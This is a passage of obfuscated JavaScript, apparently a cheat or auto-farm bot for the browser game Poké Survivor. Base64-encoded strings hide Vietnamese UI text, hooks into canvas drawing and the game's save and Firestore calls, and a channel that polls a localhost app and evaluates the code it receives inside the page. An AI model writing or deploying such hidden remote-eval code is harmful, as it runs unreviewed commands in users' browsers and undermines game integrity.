7RuZyBzw6F0IHRoxrDGoW5n","Y2jhu41uIMSR4buT","KGdp4buvIOKAlCBtdeG7kW4gYuG7jyk=","KGdp4buvKQ==","Ym9keSAq","W2RhdGEtcHNib3QtdWld","bm9uZQ==","YnV0dG9uLCBbcm9sZT1idXR0b25d","xJHDoyBjaMahaSDEkeG7pyBz4buRIHbDoW4g4oCUIGThu6tuZw==","YuG6pW0gTMawdSBnYW1l","Y2jGsGEgbMawdSB4b25nIHNhdSAxIHBow7p0OiBjaMahaSB0aeG6v3A=","xJHDoyBsxrB1IGdhbWU=","dOG7sSBjaMahaSBs4bqhaTogYuG6pW0=","Q0jhurZO","Z2hp","cA==","bQ==","Q0jhurZO","Z2hp","bQ==","c3RyaW5n","L0ZpcmVzdG9yZS9Xcml0ZS9jaGFubmVs","X19fZGF0YV9f","c3RyaW5n","Y2FudmFz","cG9zaXRpb246Zml4ZWQ7cG9pbnRlci1ldmVudHM6bm9uZTt6LWluZGV4Ojk5OTk5","ZGl2","cG9zaXRpb246Zml4ZWQ7dG9wOjYwcHg7bGVmdDowO3otaW5kZXg6","O2Rpc3BsYXk6ZmxleDtmbGV4LWRpcmVjdGlvbjpjb2x1bW47YWxpZ24taXRlbXM6ZmxleC1zdGFydDtnYXA6NHB4O21heC1oZWlnaHQ6Y2FsYygxMDB2aCAtIDQ0cHgpO3BvaW50ZXItZXZlbnRzOm5vbmU=","ZGl2","b3JkZXI6Mjtmb250OjEycHggbW9ub3NwYWNlO2JhY2tncm91bmQ6IzE3MWQyN2U2O2NvbG9yOiM4ZmI0ZmY7Ym9yZGVyOjFweCBzb2xpZCAjMmUzODQ1O3BhZGRpbmc6NHB4IDhweDtib3JkZXItcmFkaXVzOjhweDtwb2ludGVyLWV2ZW50czpub25lO3dpZHRoOjI1MHB4O21heC13aWR0aDpjYWxjKDEwMHZ3IC0gOHB4KTtib3gtc2l6aW5nOmJvcmRlci1ib3g=","cHg=","cHg=","cHg=","cHg=","MmQ=","bm9uZQ==","R+G6rk4gTkjDg04gKEY3KTogY2xpY2sgdsOgbyB24bqtdCB0csOqbiBtw6BuIGjDrG5o","T04=","T0ZG","I2ZmZg==","IzBmZg==","I2Y0NA==","I2Y5MA==","I2Y5MA==","I2Y5MA==","cG9seQ==","bGluZQ==","IzRmNA==","I2Y0Zg==","I2ZkMw==","I2ZmMA==","IzZmYw==","I2ZiNA==","IzBmYw==","I2ZhMA==","IzBmYzY=","Izg4Zg==","I2YwZjg=","IzBmZjY=","I2ZmZg==","I2ZmZg==","I2ZmNA==","I2ZmZjg=","IzRjZg==","cHNib3QucnVucw==","a2V5ZG93bg==","a2V5dXA=","cG9pbnRlcmRvd24=","bW91c2Vkb3du","Y2xpY2s=","dG91Y2hzdGFydA==","dG91Y2htb3Zl","dG91Y2hlbmQ=","Zml4ZWQ=","cHg=","cHg=","Y2FsYygxMDB2aCAtIDhweCk=","cG9pbnRlcmRvd24=","cHg=","cHg=","cG9pbnRlcmRvd24=","W2RhdGEtZHJhZ10=","YnV0dG9uLGEsaW5wdXQsc2VsZWN0LFtkYXRhLW1zPSJjbG9zZSJd","cG9pbnRlcm1vdmU=","cG9pbnRlcnVw","cG9pbnRlcmNhbmNlbA==","cG9pbnRlcm1vdmU=","cG9pbnRlcm1vdmU=","cG9pbnRlcnVw","cG9pbnRlcmNhbmNlbA==","Y3Vyc29yOm1vdmU7dG91Y2gtYWN0aW9uOm5vbmU7dXNlci1zZWxlY3Q6bm9uZQ==","bm9uZQ==","Zml4ZWQ=","cHg=","cHg=","Y2FsYygxMDB2aCAtIDhweCk=","KG1heC1oZWlnaHQ6IDUyMHB4KSwgKG1heC13aWR0aDogNjAwcHgp","ZGl2","cHNi","b3JkZXI6MDtmbGV4OjAgMCBhdXRvO3BvaW50ZXItZXZlbnRzOmF1dG87d2lkdGg6MjUwcHg7bWF4LXdpZHRoOmNhbGMoMTAwdncgLSA4cHgp","PGRpdiBkYXRhLWN0bD0iZ3N0YXRlIiBjbGFzcz0icHNiLW11dGVkIiBzdHlsZT0iZm9udC1zaXplOjExcHgiPjwvZGl2PjxkaXYgZGF0YS1jdGw9InN1Z2dlc3QiIGNsYXNzPSJwc2ItdGlwIiBzdHlsZT0iZGlzcGxheTpub25lO3doaXRlLXNwYWNlOnByZS1saW5lIiB0aXRsZT0iU+G7qWMgbeG6oW5oIGtoaSB0cmVvIG3DoXk6IG1vdmUgdOG7sSBuZ+G6r20gdOG7kXQgbmjhuqV0IMOXIGNo4buJIHPhu5EgdOG6pW4gY8O0bmcgaOG7o3AgbW92ZSDDlyBjw7luZyBo4buHIMOXIHRo4budaSB0aeG6v3QgdOG7sSB04bqhbyDDlyDEkeG7mSB0csOidSDDlyB04buRYyDEkeG7mSDDlyBuw6JuZyBj4bqlcCDEkcOjIG11YS4gQm90IGtow7RuZyB04buxIMSR4buVaSBwb2vDqW1vbi4iPjwvZGl2Pg==","PGxhYmVsIGNsYXNzPSJwc2Itcm93IHBzYi1tdXRlZCIgdGl0bGU9IlbDoW4gZG8gYm90IGNoxqFpIGtow7RuZyBsw6puIGLhuqNuZyB44bq/cCBo4bqhbmciPjxpbnB1dCBkYXRhLWN0bD0ibm9yYW5rIiB0eXBlPSJjaGVja2JveCI+IEtow7RuZyBn4butaSBi4bqjbmcgeOG6v3AgaOG6oW5nPC9sYWJlbD4=","cHNib3Qtc3RhdHVz","cHNib3QucG9zLmRvY2s=","cnVucw==","NQ==","cnVucw==","NQ==","cHNib3QubWlu","bWlu","Kw==","4oCT","MQ==","bWlu","bWlu","cHNib3QudGlwLjM=","dGlw","dGlweA==","dGlweA==","dGlw","MQ==","cHNib3QuYXV0b3NraWxs","MA==","YXV0b3NraWxs","YXV0b3NraWxs","YXV0b3NraWxs","MQ==","MA==","ZmFybWl0ZW1z","ZmFybWl0ZW1z","ZmFybWl0ZW1z","ZmFybWl0ZW1z","bm9yYW5r","bm9yYW5r","bm9yYW5r","bm9yYW5r","aGFsdGFjdHM=","W2RhdGEtYWN0XQ==","aGFsdGFjdHM=","W2RhdGEtdGFiXQ==","Y2xpY2s=","W2RhdGEtdGFiXQ==","YXJpYS1zZWxlY3RlZA==","W2RhdGEtcGFuZV0=","c2V0","bGl0ZW5vdGU=","Q2jGsGEgbuG6oXAgxJHGsOG7o2MgY29yZS9saXRlLmpzIG7Dqm4gY2jGsGEgY2jhu4luaCDEkcaw4bujYyBwaOG6p24gZ2nhuqNtIGxhZy4=","aW5wdXRbZGF0YS1saXRlXQ==","c2VsZWN0W2RhdGEtbGl0ZV0=","W2RhdGEtcHJlc2V0XQ==","c2Vs","aW5wdXRbZGF0YS1saXRlXQ==","c2VsZWN0W2RhdGEtbGl0ZV0=","W2RhdGEtcHJlc2V0XQ==","W2RhdGEtbGl0ZV0sW2RhdGEtcHJlc2V0XQ==","cmVsb2Fk","I2ZmY2MzMw==","I2ZmY2MzMw==","IzYwYTVmYQ==","IzYwYTVmYQ==","IzRhZGU4MA==","IzRhZGU4MA==","I2Y0NzJiNg==","I2Y0NzJiNg==","cHNib3QuYWNjZW50","eGFuaA==","LS1wc2ItYWNj","LS1wc2ItYWNjMg==","W2RhdGEtYWNjXQ==","YXJpYS1wcmVzc2Vk","W2RhdGEtYWNjXQ==","eGFuaA==","cnVucw==","dsO0IGjhuqFu","dOG6oW0gZOG7q25nIOKAlCBi4bqhbiBjw7MgdGjhu4MgdOG7sSDEkWnhu4F1IGtoaeG7g24=","dGnhur9wIHThu6Vj","ZOG7q25n","cGxheQ==","aHBsYXk=","cGxheQ==","4pagIEThu6tuZw==","4pa2IENo4bqheQ==","cGxheQ==","c3RvcA==","Z28=","ZG90","IG9u","aHBsYXk=","4pag","4pa2","aHBsYXk=","b24=","Z3N0YXRl","Z3N0YXRl","xJDhu41jIGdhbWU6IGtow7RuZyAoxJHhu41jIG3DoG4gaMOsbmgpIOKAlCB04bqjaSBs4bqhaSB0cmFuZyDEkeG7gyB0aOG7rSBs4bqhaQ==","xJFhbmcgbMOhaQ==","c3VnZ2VzdA==","c3VnZ2VzdA==","c3VnZ2VzdA==","c3VnZ2VzdA==","bm9uZQ==","aGFsdGFjdHM=","aGFsdGFjdHM=","aGFsdGFjdHM=","aGFsdGFjdHM=","bm9uZQ==","c3RhdHVz","4pqgIEtow7RuZyB0aOG6pXkgaMOsbmggZ2FtZTogYm90IMSRYW5nIGNo4bqheSBuZ2/DoGkgdHJhbmcgKHNhbmRib3gpLiBU4bqjaSBs4bqhaSB0cmFuZzsgduG6q24gduG6rXkgdGjDrCBkw7luZyBGaXJlZm94ICsgVmlvbGVudG1vbmtleS4g","Q2jGsGEgY2jhuqF5IOKAlCBuaOG6rXAgc+G7kSB2w6FuIHLhu5NpIGLhuqVtIOKWtg==","xJBhbmcgY2jhuqF5","VOG6oW0gZOG7q25n","ICh2w7QgaOG6oW4p","ZGVmYXVsdA==","b2JqZWN0","ZGVmYXVsdA==","ZGl2","cHNi","b3JkZXI6MTtmbGV4OjAgMCBhdXRvO3BvaW50ZXItZXZlbnRzOmF1dG87d2lkdGg6MzIwcHg7bWF4LXdpZHRoOmNhbGMoMTAwdncgLSA4cHgpO2Rpc3BsYXk6bm9uZQ==","cHNib3QucG9zLm1vdmVzZXQ=","c3RhdHVz","YnVmZg==","Pw==","Pw==","bW9u","c2VsZWN0ZWQ=","VE0gxJHDoyBk4bqheQ==","VE0g4pyTIA==","ZG9vZmNyYWZ0","UG9rw6kgTWFydA==","S2VjbGVvbiBTaG9w","VE0g","c2xvdHM=","4piFIA==","S2jDtG5nIGPDsyB0cm9uZyBwb2tlZGV4","Q2jhu41uIHBva8OpbW9u","RGFuaCBzw6FjaCBtb3ZlIGzhuqV5IHThu6sgZ2FtZS4g","QnVpbGQgbeG6t2MgxJHhu4tuaCAoY2jGsGEgbMawdSk6IG1vdmUga2jhu59pIMSR4bqndSDihpIgYnVmZiB04bqlbiBjw7RuZyBo4bujcCBwb2vDqW1vbiDihpIgSGFyZGVuOyDDtCB0cuG7kW5nIGJvdCB04buxIGNo4buNbi4gU+G7rWEgcuG7k2kgYuG6pW0gTMawdSDEkeG7gyBnaeG7ry4g","xJBhbmcgZMO5bmcgYnVpbGQgY8OzIHPhurVuIChwb2tlc3Vydml2b3ItYXV0b2Zhcm0pLiA=","cGljaw==","bm9uZQ==","ZWRpdA==","bm9uZQ==","dGl0bGU=","TW92ZXNldA==","bGlzdA==","QnVpbGQgbeG6t2MgxJHhu4tuaCAoY2jGsGEgbMawdSkgwrcgw7QgdHLhu5FuZyBib3QgdOG7sSBjaOG7jW4=","QnVpbGQgY8OzIHPhurVuIChwb2tlc3Vydml2b3ItYXV0b2Zhcm0p","QnVpbGQgxJHDoyBsxrB1","xJDDoyBsxrB1OiA=","LCA=","LCA=","Q2jGsGEgdOG7sSBsxrB1IGJ1aWxkIG7DoG8=","Y3Vy","Z28=","Y3Vy","aW5mbw==","bm9uZQ==","bW9u","bW9u","bXNn","bm9uZQ==","ZmxleA==","bm9uZQ==","cHNib3QucG9zLm1vdmVzZXQ=","ZGF0YWxpc3Q=","JnF1b3Q7","bW9u","bW9u","bW9u","bXNn","bW92ZXNldA==","Y2xvc2U=","bW9u","ZWRpdA==","bW9u","bW9u","Y3Vy","bW9u","bXNn","Q2jGsGEgdGjhuqV5IHTDqm4gcG9rw6ltb24gKHbDoG8gdHLhuq1uIHRyxrDhu5tjKQ==","c2F2ZQ==","bW9u","c2VsZWN0W2RhdGEtc2xvdF0=","bXNn","Q2jhu41uIHBva8OpbW9uIHbDoCDDrXQgbmjhuqV0IDEgbW92ZQ==","bXNn","ID4g","LCA=","ZGVs","bW9u","bXNn","bGlzdA==","W2RhdGEtbG9hZF0=","bW9u","ZGl2","cHNi","b3JkZXI6MTtmbGV4OjAgMCBhdXRvO3BvaW50ZXItZXZlbnRzOmF1dG87d2lkdGg6MzAwcHg7bWF4LXdpZHRoOmNhbGMoMTAwdncgLSA4cHgpO2Rpc3BsYXk6bm9uZQ==","cm93cw==","O2NvbG9yOiNmZjlhOWE7Ym9yZGVyLXRvcDoxcHggZGFzaGVkICNjOTRhNGE7Ym9yZGVyLWJvdHRvbToxcHggZGFzaGVkICNjOTRhNGE=","ZGlzYWJsZWQ=","ZGlzYWJsZWQ=","bXNn","VGjhu6kgdOG7sSBj4bunYSBi4bqhbiAoxJHDoyBsxrB1KQ==","Y2xvc2U=","bm9uZQ==","ZmxleA==","bm9uZQ==","cm93cw==","W2RhdGEtbW92ZV0=","LA==","cmVzZXQ=","bGV2ZWx1cA==","TGV2ZWwtdXAgU2V0","cmVyb2xs","bGV2ZWx1cA==","VGjhu6kgdOG7sSBjaOG7jW4gdGjhursga2hpIGzDqm4gY+G6pXAsIHRyw6puIGPDuW5nIMawdSB0acOqbiBuaOG6pXQuIFRo4bq7IHThu5F0IG5o4bqldCDEkWFuZyBjw7MgbuG6sW0gZMaw4bubaSBkw7JuZyByZXJvbGwgdGjDrCBib3QgcmVyb2xsIChraGkgY8OybiBsxrDhu6N0KS4=","xJBhbmcgZMO5bmcgdGjhu6kgdOG7sSBt4bq3YyDEkeG7i25oIChnaeG7kW5nIHBva2VzdXJ2aXZvci1hdXRvZmFybSk=","aXRlbXM=","SXRlbSBTZXQ=","ZHJvcA==","aXRlbXM=","VGjhu6kgdOG7sSDEkeG7kyBj4bqnbSBraGkgZ2FtZSBjaG8gY2jhu41uIChjaOG7iSBj4bqnbSDEkcaw4bujYyAxIG3Ds24pLCB0csOqbiBjw7luZyDGsHUgdGnDqm4gbmjhuqV0LiBNw7NuIGTGsOG7m2kgZMOybmcgImLhu48iIHRow6wgxJHhu5VpIHNhbmcgYuG6pXQgY+G7qSBtw7NuIG7DoG8ga2jDoWMgxJHGsOG7o2MgxJHGsGEu","xJBhbmcgZMO5bmcgdGjhu6kgdOG7sSBt4bq3YyDEkeG7i25oICjGsHUgdGnDqm4gc+G7kW5nIGzDonUp","bm9uZQ==","YmxvY2s=","bm9uZQ==","Y2FudmFz","MmQ=","Izg4OA==","Y2FudmFz","MmQ=","ZGl2","b3JkZXI6Mztwb2ludGVyLWV2ZW50czphdXRvO3dpZHRoOjM4MHB4O21heC13aWR0aDpjYWxjKDEwMHZ3IC0gOHB4KTttaW4taGVpZ2h0OjA7ZmxleDowIDEgYXV0bztvdmVyZmxvdzphdXRvO2ZvbnQ6MTFweCBtb25vc3BhY2U7YmFja2dyb3VuZDojMTAxNDE4ZWU7Y29sb3I6I2RkZDtib3JkZXI6MXB4IHNvbGlkICMzNDU7Ym9yZGVyLXJhZGl1czo2cHg7ZGlzcGxheTpub25l","cHNib3QucG9zLmNhdGFsb2c=","VOG7kXQ=","IzRmNA==","Tmd1eSBoaeG7g20=","I2Y5MA==","UmlmdA==","I2Y0Zg==","VuG6rXQgY+G6o24=","Izg4Zg==","QnVmZg==","I2ZmMA==","S2luaCBuZ2hp4buHbQ==","IzBmYw==","VmFsaSAoxJHhu6luZyA1cyk=","I2ZhMA==","UGjDoSDEkcaw4bujYw==","I2M5Ng==","SOG7k2kgbcOhdQ==","IzZmYw==","QW4gdG/DoG4=","IzljZg==","bm9uZQ==","aGF6YXJk","IzIyMw==","IzAwMA==","I2NjYw==","Zm9udC13ZWlnaHQ6Ym9sZA==","b3BhY2l0eTouNTU=","Pw==","xJHhu6luZyB5w6pu","IMK3IDxzcGFuIHN0eWxlPSJjb2xvcjojZjY2Ij5xdcOhaTwvc3Bhbj4=","QuG7jw==","Izg4OA==","Y2xpY2s=","YnV0dG9uW2RhdGEtZXhwb3J0XQ==","YnV0dG9uW2RhdGEtc3JjXQ==","Iw==","bW91c2VvdmVy","W2RhdGEtcm93XQ==","bW91c2VsZWF2ZQ==","Q0FOVkFT","ZnVsbHNjcmVlbmNoYW5nZQ==","d2Via2l0ZnVsbHNjcmVlbmNoYW5nZQ==","aGlkZGVu","dmlzaWJpbGl0eVN0YXRl","dmlzaWJpbGl0eWNoYW5nZQ==","d2Via2l0dmlzaWJpbGl0eWNoYW5nZQ==","Ymx1cg==","cGFnZWhpZGU=","ZnJlZXpl","aGlkZGVu","dmlzaWJpbGl0eVN0YXRl","dmlzaWJsZQ==","a2jDtG5nIHThuqFvIMSRxrDhu6NjIFdvcmtlciAoQ1NQPykg4oCUIGNo4bqheSBu4buBbiBz4bq9IGLhu4sgQ2hyb21lIGdp4bubaSBo4bqhbiB+MSBraHVuZyBow6xuaC9nacOieQ==","c2V0SW50ZXJ2YWwoKCkgPT4gcG9zdE1lc3NhZ2UoMCksIDE2KQ==","dGV4dC9qYXZhc2NyaXB0","YmxvY2tlZA==","OmhvdmVy","a2V5ZG93bg==","Z29vZA==","aGF6YXJk","cmlmdA==","d2FsbA==","YnVmZg==","eHA=","Y2FzZQ==","YnJlYWs=","aGVhbA==","a2jDtG5n","a2jDtG5nIGPDsyBnw6wg4bufIMSRw7M=","cG9pbnRlcmRvd24=","Rjc=","RGlnaXQw","RXNjYXBl","RGlnaXQw","RXNjYXBl","a2jDtG5nIG5ow6Nu","Rjg=","Ym90","T04=","T0ZG","Rjk=","RjY=","a2V5ZG93bg==","cnVucw==","xJHDoyBjb3B5IGRhbmggbeG7pWMgdsOgbyBjbGlwYm9hcmQ=","e30=","YnVpbGQ=","Ly8gTmjDo24gc3ByaXRlICsgYnVpbGQgxJHDoyDEkcOhbmggZOG6pXUsIMSRaSBrw6htIGV4dGVuc2lvbiDEkeG7gyBtw6F5IG7DoG8gY8OgaSBjxaluZyBjw7Mgc+G6tW4uCg==","YQ==","dGV4dC9qYXZhc2NyaXB0","ZGF0YS5qcw==","dmlzaWJpbGl0eWNoYW5nZQ==","d2Via2l0dmlzaWJpbGl0eWNoYW5nZQ==","Ymx1cg==","cGFnZWhpZGU=","ZnJlZXpl","aGlkZGVu","dmlzaWJpbGl0eVN0YXRl","a2V5ZG93bg==","cG9pbnRlcmRvd24=","ZnVsbHNjcmVlbmNoYW5nZQ==","d2Via2l0ZnVsbHNjcmVlbmNoYW5nZQ==","dW5sb2FkZWQ=","W1BTRmFybV0gY2jhuqF5IGJvdC5qcyB0csaw4bubYw==","JWNbUFNGYXJtXQ==","Y29sb3I6IzZjZg==","cHNib3QuZmFybQ==","MA==","Ym9keSAq","IA==","ZGl2","cG9zaXRpb246Zml4ZWQ7Ym90dG9tOjRweDtyaWdodDo0cHg7ei1pbmRleDo5OTk5OTtmb250OjEycHggbW9ub3NwYWNlO2JhY2tncm91bmQ6IzAwMGI7Y29sb3I6IzZjZjtwYWRkaW5nOjRweCA2cHg7Ym9yZGVyLXJhZGl1czo0cHg7cG9pbnRlci1ldmVudHM6bm9uZQ==","MA==","xJHDoyB4b8OhIHRo4buRbmcga8Oq","cHJlc2V0IGZhcm0geHUgxJHDoyBi4bqtdCDigJQgUFNGYXJtLnN0YXRzKCkgeGVtIHThu6tuZyB0cuG6rW4sIFBTRmFybS5yZXNldCgpIHhvw6EgdGjhu5FuZyBrw6o=","c3RyaW5n","LnBzLWNob2ljZTpub3QoLmhpZGRlbikgLnBzLWJveC5hcm1lZA==","LnBzLWNhcmRzLmRvbmU=","aDI=","Lm5t","KHBvaW50ZXI6IGNvYXJzZSk=","Zmxvb3I=","d2FsbA==","bGlxdWlk","Zm9hbQ==","ZGlydA==","d2FsbFRvcA==","d2FsbExpZ2h0","d2FsbEVkZ2U=","d2FsbEZhY2U=","d2FsbEZhY2VEYXJr","bGlxdWlkRGVlcA==","XA==","YA==","Ig==","Jw==","e1so","fV0p","PQ==","ew==","fQ==","W1BTQm90XSBraMO0bmcgxJHhu41jIMSRxrDhu6NjIGLhuqNuZyBtb3ZlIGPhu6dhIGdhbWU=","YnVmZg==","c3RhdHVz","W1BTQm90XSBraMO0bmcgxJHhu41jIMSRxrDhu6NjIGPhuqV1IGjDrG5oIGdhbWUgKGLhuqNuZyBtw6B1IC8gdGnhur9uIGhvw6Ep","L2FwaS9zYXZl","c2FtZS1vcmlnaW4=","bm9ybWFs","bm9ybWFs","MmQ=","LnRhZy1jaGlw","Wi1Nb3Zl","dW5pcXVl","LnVuaXF1ZS1jaGlw","ZXZv","bWVnYQ==","em1vdmU=","Wi1tb3ZlIChi4bqlbSBGOiBu4buVIHF1YW5oIG3DrG5oLCBo4buTaSAxMjAgcyk=","cHNib3QuZGNSdW4=","Z2FtZQ==","Z2FtZQ==","Z2FtZQ==","Z2FtZQ==","R2FtZQ==","bW9kZQ==","Q2jhur8gxJHhu5k=","Tm9ybWFsOiBjaMahaSB04bubaSBraGkgY2jhur90LiBXYXZlczogY8OhYyB2w7JuZyBsacOqbiB0aeG6v3AsIHLGsMahbmcgZ2nhu69hIHbDsm5nLCBib3NzIG3hu5dpIDI1IHbDsm5n","bm9ybWFs","Tm9ybWFs","d2F2ZXM=","V2F2ZXM=","ZGlmZmljdWx0eQ==","xJDhu5kga2jDsw==","xJDhu5kga2jDsyBj4bunYSB2w6FuIChFYXN5IC8gTWVkaXVtIC8gSGFyZCk=","ZWFzeQ==","RWFzeQ==","bWVkaXVt","TWVkaXVt","aGFyZA==","SGFyZA==","aHlwZXI=","SFlQRVI=","SFlQRVI6IG3hu41pIHRo4bupIG3huqFuaCBsw6puIG5oYW5oIGfhuqVwIMSRw7RpLCBFdGVybmF0dXMg4bufIDMwOjAwLCDDlzEsNSB4dSwgYuG6o25nIHjhur9wIGjhuqFuZyByacOqbmcuIMSQaSBrw6htIMSRxrDhu6NjIHbhu5tpIG3hu41pIGNo4bq/IMSR4buZIC8gxJHhu5kga2jDsw==","b2Zm","VOG6r3Q=","b24=","QuG6rXQ=","b24=","Z2FtZQ==","Z2FtZQ==","Z2FtZQ==","aHlwZXI=","b24=","aHlwZXI=","Y2jhu41uIGNo4bq/IMSR4buZOg==","LCA=","VHJpY2stb3ItdHJlYXQ=","TGlnaHQgdGhlIGxhbnRlcm5z","RnJlZSB0aGUgY2FnZWQgUG9rw6ltb24=","RXNjb3J0IHRoZSBsb3N0IFBva8OpbW9u","ZmlsbDojNWZlMDhh","ZmlsbDojNWZlMDhh","ZmlsbDojN2RmZmIw","ZXNjb3J0","ZXNjb3J0","ZXNjb3J0","ZG9vcnM=","ZmlsbDpncmFkaWVudDpyZ2JhKDI1NSwxNzAsNjAsMC45KQ==","ZG9vcnM=","bGFudGVybnM=","ZmlsbDpncmFkaWVudDpyZ2JhKDE2MCwxOTAsMjU1LDAuNyk=","bGFudGVybnM=","Y2FnZQ==","Y2FnZQ==","ZmlsbDojZmZiMzQ3","IMK3","ZmlsbDojN2RmZmIw","ZXNjb3J0","ZmlsbDojZmZiMzQ3","W2RhdGEtdGVzdGlkPSJtZW51LXNvbG8iXSwgW2RhdGEtdGVzdGlkPSJzb2xvLXN0YXJ0Il0=","W2RhdGEtdGVzdGlkPSJnYW1lLWV4aXQiXQ==","W2RhdGEtdGVzdGlkPSJzYXZlZC1ydW4tbmV3LWNvbmZpcm0iXSBbZGF0YS10ZXN0aWQ9ImRpYWxvZy1jb25maXJtIl0=","W2RhdGEtdGVzdGlkPSJzYXZlZC1ydW4tcmVzdW1lIl0=","W2RhdGEtdGVzdGlkPSJzb2xvLXN0YXJ0Il0=","W2RhdGEtdGVzdGlkPSJtZW51LXNvbG8iXQ==","cHNib3QuZmFybWl0ZW1z","RmFybSB2w6k6IHLGsMahbmcgY2jhu41uIFRpY2tldHM=","UsawxqFuZyBnaeG7r2EgdsOybmcgKGNo4bq/IMSR4buZIFdhdmVzKSBjaG8gY2jhu41uIFJhcmUgQ2FuZHkgLyBVcGdyYWRlIC8gVGlja2V0cy4gQuG6rXQ6IGx1w7RuIGzhuqV5IFRpY2tldHMgKHbDqSBnYWNoYSwgZ2nhu68gbOG6oWkgc2F1IGtoaSBjaOG6v3QpLiBU4bqvdDogbsOibmcgbW92ZSBidWlsZCA+IFJhcmUgQ2FuZHkgPiBuw6JuZyBraMOhYyA+IHbDqQ==","MQ==","MQ==","MA==","ZG9vZmNyYWZ0","RG9vZmNyYWZ0IMK3IHBva2VzdXJ2aXZvci5kb29mY3JhZnQuY29t","Zg==","S2V5Rg==","YXBw","Y2FudmFzLnBzLWNhbnZhcw==","eHA=","eHA=","Z29vZA==","Z29vZA==","Z29vZA==","aGF6YXJk","c2hvdA==","d2FsbA==","aGVhbA==","YnJlYWs=","aGF6YXJk","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","YnJlYWs=","W2RhdGEtdGVzdGlkPSJyZXJvbGwiXQ==","YnV0dG9uLnBzLWNhcmQ=","LnBzLWNob2ljZTpub3QoLmhpZGRlbikgLnBzLWJveA==","YnV0dG9uLnBzLWNhcmQ=","csawxqFuZw==","IA==","bMOqbiAxIGPhuqVw","dsOpIGdhY2hhIChmYXJtIHbDqSk=","dsOpIGdhY2hh","bmdvw6BpIGJ1aWxk","Y2jhu41u","IA==","W2RhdGEtdGVzdGlkPSJzYXZlZC1ydW4tcmVzdW1lIl0=","W2RhdGEtdGVzdGlkPSJzYXZlZC1ydW4tbW9kZSJd","d2F2ZXM=","bm9ybWFs","b24=","b2Zm","bWVkaXVt","Z2FtZQ==","4pa2IENoxqFpIHRp4bq/cCB2w6FuIGzGsHU=","xJDhu5VpIDMgw7QgY2jhur8gxJHhu5kgY2hvIGto4bubcCB2w6FuIMSRYW5nIGzGsHUgcuG7k2kgY2jhuqF5","4pyVIELhu48gdsOhbiBsxrB1","QuG6pW0gRW5kIHJ1biAobeG6pXQgdsOhbiDEkWFuZyBsxrB1KSBy4buTaSBjaOG6oXkgxJHDum5nIGNo4bq/IMSR4buZIMSRw6MgY2jhu41u","W2RhdGEtdGVzdGlkPSJzYXZlZC1ydW4tZW5kIl0=","W2RhdGEtdGVzdGlkPSJzb2xvLXN0YXJ0Il0=","aGF6YXJk","aGF6YXJk","eHA=","Z29vZA==","Z29vZA==","Y2FzZQ==","Y2FzZQ==","Z29vZA==","Z29vZA==","c2FmZQ==","aGVhbA==","Z29vZA==","cmlmdA==","cmlmdA==","cmlmdA==","cmlmdA==","Z29vZA==","Z29vZA==","Z29vZA==","d2FsbA==","d2FsbA==","d2FsbA==","d2FsbA==","c2FmZQ==","d2FsbA==","d2FsbA==","c2FmZQ==","YnVmZg==","eHA=","W1BTQm90XQ==","xJHDoyB04bqjaSwgY2jhu50gZ2FtZeKApg==","bG9hZGluZw==","RE9NQ29udGVudExvYWRlZA==","W1BTQm90XQ==","W1BTQm90XSBldmFsIHRyb25nIHRyYW5nIGLhu4sgY2jhurduLCBjaOG6oXkgcXVhIHNhbmRib3g=","Vw==","aHR0cDovLzEyNy4wLjAuMTozODc2NQ==","P3Q9","JnBpZD0=","dmlzaWJsZQ==","c3RyaW5n","xJHGsOG7nW5nIGThuqtuIGtow7RuZyBo4bujcCBs4buH","Lg==","Y2jGsGEgY8OzIA==","Lg==","cHNib3QuZGNSdW4=","e30=","Y2FsbA==","ZnVuY3Rpb24=","a2jDtG5nIHBo4bqjaSBow6BtOiA=","Z2V0","c2V0","c3RhdGU=","cnVu","a2V5","cHNib3QuZGNSdW4=","e30=","cmVsb2Fk","bOG7h25oIGzhuqE=","L3Jlc3VsdA==","UE9TVA==","dGV4dC9wbGFpbg==","Jmhvc3Q9","JnZpcz0=","JmhlbGxvPTE=","L3BvbGw=","bm8tc3RvcmU=","dHRfdG9rZW4=","c2FpIG3Dow==","aHR0cCA=","dmlzaWJpbGl0eWNoYW5nZQ==","L3Zpcw==","JnZpcz0=","UE9TVA==","dGV4dC9wbGFpbg==","dHRfdG9rZW4=","VHJvbGxNb2RQb2tlOiBkw6FuICJtw6Mga+G6v3QgbuG7kWkiIHThu6sgYXBwIChtZW51IPCfjaQgPiBDw6BpIMSR4bq3dCA+IFNhbyBjaMOpcCBtw6Mga+G6v3QgbuG7kWkp","dHRfdG9rZW4=","bG9hZGluZw==","RE9NQ29udGVudExvYWRlZA=="];
function _0xstr(_0xi){const _0xs=atob(_0xarr[_0xi]);let _0xo='';for(let _0xj=0;_0xj<_0xs.length;_0xj++)_0xo+='%'+('0'+_0xs.charCodeAt(_0xj).toString(16)).slice(-2);return decodeURIComponent(_0xo);}
window.__TT_HIDE = true;
window.__TT_OPT = {};
window.__TT_MINI = {};
(function () {
    if (window.__TT)
        return;
    var st = null;
    function apply() {
        var root = document.head || document.documentElement;
        if (!root)
            return;
        if (window.__TT_HIDE && !st) {
            st = document.createElement(_0xstr(0x0));
            st.textContent = _0xstr(0x1);
            root.appendChild(st);
        }
        else if (!window.__TT_HIDE && st) {
            st.remove();
            st = null;
        }
    }
    var nativeDraw = CanvasRenderingContext2D.prototype.drawImage;
    var DEF = { style: _0xstr(0x2), mode: _0xstr(0x3) };
    var cfg = {};
    var cv = null, g = null, items = [], itemsAt = -1e9;
    var PW = 420;
    function mergeCfg(o) {
        for (var k in DEF)
            cfg[k] = (o && o[k] !== undefined) ? o[k] : (cfg[k] !== undefined ? cfg[k] : DEF[k]);
    }
    var SKIP = /^(SCRIPT|STYLE|LINK|META|HEAD|TITLE|NOSCRIPT|BR|TEMPLATE|OPTION)$/;
    function scan() {
        var out = [], n = 0, VW = innerWidth, VH = innerHeight;
        var tw = document.createTreeWalker(document.body, NodeFilter.SHOW_ELEMENT);
        var el;
        while ((el = tw.nextNode()) && n < 700) {
            if (SKIP.test(el.tagName) || el.closest(_0xstr(0x4)))
                continue;
            var r = el.getBoundingClientRect();
            if (r.width < 2 || r.height < 2 || r.right < 0 || r.bottom < 0 || r.left > VW || r.top > VH)
                continue;
            var cs = getComputedStyle(el);
            if (cs.display === _0xstr(0x5) || cs.visibility === _0xstr(0x6) || cs.opacity === _0xstr(0x7))
                continue;
            var tag = el.tagName, it = null;
            if (tag === _0xstr(0x8)) {
                out.push({ t: _0xstr(0x9), el: el, r: r });
                n++;
